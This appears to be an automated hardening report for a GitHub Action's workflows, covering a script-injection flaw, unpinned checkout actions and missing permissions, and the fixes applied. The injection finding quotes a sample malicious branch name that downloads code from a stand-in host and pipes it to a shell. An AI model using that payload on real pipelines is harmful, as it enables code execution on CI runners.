<!-- markdownlint-disable -->

# Hardening Report: dawidd6--action-homebrew-bump-formula/v6

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **dawidd6--action-homebrew-bump-formula/v6** was hardened automatically. 3 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### script-injection (severity: high)

Sub-rule (a): The `Delete` step in close-pr.yml directly interpolates `${{github.event.pull_request.head.ref}}` into a `run:` shell command: `git push origin --delete ${{github.event.pull_request.head.ref}}`. This value is attacker-controlled — any user who opens a pull request controls the branch name and can inject arbitrary shell commands (e.g. a branch named `x; curl attacker.com | sh`). The expression must be moved to an `env:` variable and the variable must be double-quoted in the shell command.

Locations:

- `.github/workflows/close-pr.yml:20`

### unpinned-uses (severity: high)

Both workflow files reference `actions/checkout@v4`, which is a mutable tag rather than a pinned 40-character commit SHA. A compromised or malicious update to that tag could execute arbitrary code in the runner. All `uses:` references should be pinned to a full SHA (e.g. `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4`).

Failing references:
- `.github/workflows/close-pr.yml`: `uses: actions/checkout@v4`
- `.github/workflows/test.yml`: `uses: actions/checkout@v4` (appears in three jobs)

Locations:

- `.github/workflows/close-pr.yml:17`
- `.github/workflows/test.yml:30`
- `.github/workflows/test.yml:43`
- `.github/workflows/test.yml:59`

### missing-permissions (severity: medium)

Neither `.github/workflows/close-pr.yml` nor `.github/workflows/test.yml` declares a top-level `permissions:` key, and no individual job within either file declares its own `permissions:` block. Without explicit permissions, workflows run with the repository's default token permissions, which may be overly broad (e.g. `write` on contents, pull-requests, etc.). Each workflow should declare the minimal permissions required.

Locations:

- `.github/workflows/close-pr.yml:1`
- `.github/workflows/test.yml:1`

## Iteration Notes

### Iteration 1

**Fixes applied:** script-injection, unpinned-uses, missing-permissions

**Notes:**

Fixed all three findings across both workflow files:
1. **script-injection** (close-pr.yml line 20): Moved `${{ github.event.pull_request.head.ref }}` into an `env:` block as `HEAD_REF` and referenced it as `"$HEAD_REF"` in the shell command, preventing branch-name-based shell injection.
2. **unpinned-uses**: Pinned all four `actions/checkout@v4` references to the full commit SHA `11d5960a326750d5838078e36cf38b85af677262` with a `# v4` comment for readability (1 in close-pr.yml, 3 in test.yml).
3. **missing-permissions**: Added `permissions: contents: write` to close-pr.yml (required to delete remote branches via `git push --delete`) and `permissions: {}` to test.yml (the workflow itself needs no special GITHUB_TOKEN permissions; the action uses a separately provided token secret).

